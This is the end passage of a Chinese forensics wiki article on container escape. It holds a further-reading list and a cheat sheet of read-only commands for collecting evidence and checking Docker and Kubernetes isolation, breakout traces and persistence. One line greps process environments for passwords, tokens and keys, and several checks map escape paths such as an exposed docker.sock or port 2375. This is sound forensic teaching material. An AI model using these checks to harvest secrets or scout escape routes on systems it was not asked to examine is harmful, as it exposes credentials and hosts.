本篇停在"判定隔离状态与突破痕迹"。往下走有四类延伸——配置面怎么管、痕迹怎么在别处验证、逃逸之后留了什么、以及这类结论怎么写。

**配置面：把单个容器放到集群基线里看**

- [K8s 取证工件地图](server-k8s-kubernetes-artifact-map.md) —— Pod spec 与审计日志 `requestObject` 在整体工件里的位置；静态 Pod 清单在哪。K8s 侧的完整高危配置判据集（Pod Security Admission、`runtimeClassName`、自定义策略引擎）以本篇 2.7 与第三章为准。
- [审计日志与 ConfigMap-Secret](server-k8s-configmap-secret.md) —— **谁在什么时候创建了这个特权 Pod**。审计日志是配置变更的唯一时间线来源。

**痕迹验证：同一件事在别处的印证**

- [Docker 取证工件地图](../server-docker/server-docker-docker-artifact-map.md) —— `/var/lib/docker/containers/<id>/config.v2.json` 全字段与采集时机。**容器删掉之后，只剩卷和镜像。**
- [Volume 与绑定挂载取证](../server-docker/server-docker-docker-volumes-and-bind-mounts.md) —— **`hostPath` 挂载在卷侧的对应物**。本篇讲配置怎么读，那一篇讲落点怎么走。
- [proc 虚拟文件系统取证](../../computer/computer-shell/computer-shell-proc.md) —— `/proc/<pid>/ns/*` 与 `/proc/<pid>/status` 的完整读法，以及"哪些 namespace inode 相同说明共享"的判据。
- [进程与注入检测](../../memory/memory-analyze/memory-analyze-process-and-injection-detection.md) —— **运行时痕迹的内存侧视图**。内存镜像里能看到的注入与异常内存段，是突破痕迹的旁证。

**逃逸之后：宿主机侧的持久化**

- [Linux 计划任务与持久化痕迹](../../computer/computer-persistence/computer-persistence-scheduled-tasks-and-persistence.md) —— cron、systemd、SUID 这些宿主侧的落脚点。**突破隔离之后攻击者做的事和普通主机入侵没有区别。**
- [镜像层与 overlay2 解析](../server-docker/server-docker-overlay2.md) —— **改写镜像层实现持久化的检测**：层链里的 `RUN` 指令就是配方。
- [取证工件地图（Linux 侧）](../../computer/computer-persistence/computer-persistence-persistence-artifact-map.md) —— 宿主机的整体痕迹全景。

**结论表述与误报排除**

- [取证流程与原则](../../fundamentals/fundamentals-process/fundamentals-process-five-stage-forensics-process.md) —— "先内存、后状态、最后文件系统"这个顺序的依据，以及不可逆操作的处理纪律。
- [反取证手法与时间戳篡改检测](../../fundamentals/fundamentals-concepts/fundamentals-concepts-anti-forensics-and-timestamp-tampering.md) —— **宿主机文件被清理、时间戳归一化**的识别。逃逸类案件几乎必然伴随反取证动作。
- [时间戳换算](../../fundamentals/fundamentals-concepts/fundamentals-concepts-timestamps-and-timezones.md) —— `/proc` 侧时间、cgroup 时间、镜像层时间的量级与基准对齐。
- [取证概念与分类](../../fundamentals/fundamentals-concepts/fundamentals-concepts-digital-forensics-concepts.md) —— **"具备条件"与"实际发生"在证据法上的区别**。本篇最容易被误判的方向，这一篇给的是概念基础。
<a id="section-42"></a>

## 七、命令速查

```bash
# ===== 1. ★ 易失采集顺序（不可颠倒）=====
sudo insmod ./LiME/linux-memory-x64.ko path=/mnt/evidence/mem.lime
docker ps -a --no-trunc > /evidence/docker/ps-a.txt
docker inspect $(docker ps -aq) > /evidence/docker/inspect-all.json
docker diff digiforensics-app > /evidence/docker/diff.txt
sudo tar czf /mnt/evidence/run-containerd.tgz /run/containerd 2>/dev/null   # tmpfs，重启即失
ps -ef > /mnt/evidence/ps-ef.txt
cp -p /var/log/kubernetes/audit.log* /evidence/k8s/ 2>/dev/null
dd if=/dev/sda of=/mnt/evidence/DigiForensics.dd bs=4M status=progress conv=noerror,sync

# ===== 2. 容器隔离配置面（筛选脚本见正文 3.2）=====
docker inspect digiforensics-app | python3 -c "
import json,sys
c=json.load(sys.stdin)[0]; h=c.get('HostConfig') or {}
for k in ('Privileged','CapAdd','PidMode','NetworkMode','IpcMode','SecurityOpt','Devices'):
    print(k, '=', h.get(k))
for b in h.get('Binds') or []: print('Bind =', b)
"
docker inspect $(docker ps -aq) | grep -oE '"Privileged":(true|false)|"PidMode":"[a-z]+"|"NetworkMode":"[a-z]+"'

# ===== 3. 容器内隔离状态（★ 必须在容器存活时；优先 docker cp 而非 exec）=====
docker cp /tmp/container-selfcheck.sh digiforensics-app:/tmp/selfcheck.sh
docker exec digiforensics-app sh /tmp/selfcheck.sh
# 容器内直接执行的关键项：
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status    # CapEff 全 f = 特权；Seccomp:0 = 未过滤
cat /proc/self/cgroup                                    # 含 docker-/kubepods = 在容器内
wc -l < /proc/self/mountinfo                              # 行数暴增 = 可见范围扩大
grep -E ' /etc/kubernetes | /var/lib/docker | /host ' /proc/self/mountinfo
ls -l /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null
ls /proc | grep -cE '^[0-9]+$'                            # 远大于容器进程数 = --pid=host

# ===== 4. 宿主机侧突破痕迹 =====
ss -lntp | grep -E ':2375|:2376'                          # ★ 2375 监听 = 宿主机 root 等同
grep -nE '"hosts"|2375' /etc/docker/daemon.json
ps -ef | grep '[c]ontainerd-shim'                         # 运行中容器数
find /run/containerd/io.containerd.runtime.v2.task -name log.jsonl 2>/dev/null
find / -xdev -type f -perm -4000 -newermt '2024-03-01' 2>/dev/null | head    # 新增 SUID
crontab -l; cat /etc/cron.d/* 2>/dev/null                 # ★ docker start = 容器持久化

# ===== 5. 进程与 namespace =====
readlink /proc/<pid>/ns/pid
sudo ls -l /proc/<pid>/cwd /proc/<pid>/root /proc/<pid>/exe
sudo ls -l /proc/<pid>/fd 2>/dev/null | grep -vE 'socket|pipe'
sudo tr '\0' '\
' < /proc/<pid>/environ | grep -E 'PASS|SECRET|TOKEN|KEY'   # ★ 授权后脱敏

# ===== 6. K8s 高危形态（筛选脚本见正文 3.6）=====
kubectl get pods -A -o json | python3 -c "
import json,sys
for p in json.load(sys.stdin)['items']:
    s=p['spec']
    hp=[v['hostPath']['path'] for v in s.get('volumes') or [] if 'hostPath' in v]
    priv=[c['name'] for c in s.get('containers') or [] if (c.get('securityContext') or {}).get('privileged')]
    f=[k for k in ('hostNetwork','hostPID','hostIPC') if s.get(k)]
    if hp or priv or f: print(p['metadata']['namespace']+'/'+p['metadata']['name'], f, priv, hp)
"
kubectl get ds -A -o wide                                          # ★ DaemonSet 持久化
ls -l /etc/kubernetes/manifests/                                   # ★ 静态 Pod（绕过 API Server）
kubectl get clusterrolebinding -o json | python3 -c "
import json,sys
for b in json.load(sys.stdin)['items']:
    if b.get('roleRef',{}).get('name') in ('cluster-admin','edit'):
        for s in b.get('subjects') or []: print(b['metadata']['name'],'->',b['roleRef']['name'],s)
"
kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\
"}{end}' | sort -u

# ===== 7. 收尾 =====
sha256sum -c /evidence/evidence.sha256
# ⚠️ 全程只读：不停容器、不删文件、不改配置；所有操作留操作日志
```

---

📌 **版权与引用声明**

本文为 DigiForensics 独立创作的知识条目，采用 [知识共享 署名-相同方式共享 4.0 国际](https://creativecommons.org/licenses/by-sa/4.0/deed.zh-hans) 许可协议发布。

- **署名**：引用本文时请注明「DigiForensics Wiki — 服务器与 Web 取证 — 容器逃逸与运行时痕迹」
- **相同方式共享**：衍生作品须采用相同协议发布

示例：`本文内容参考自 DigiForensics Wiki《容器逃逸与运行时痕迹》（CC BY-SA 4.0）`

文中 `DigiForensics.dd`、`DigiForensics-image.tar` 等均为示例证据文件名，指向虚构或已脱敏的检材，与真实案件无关。
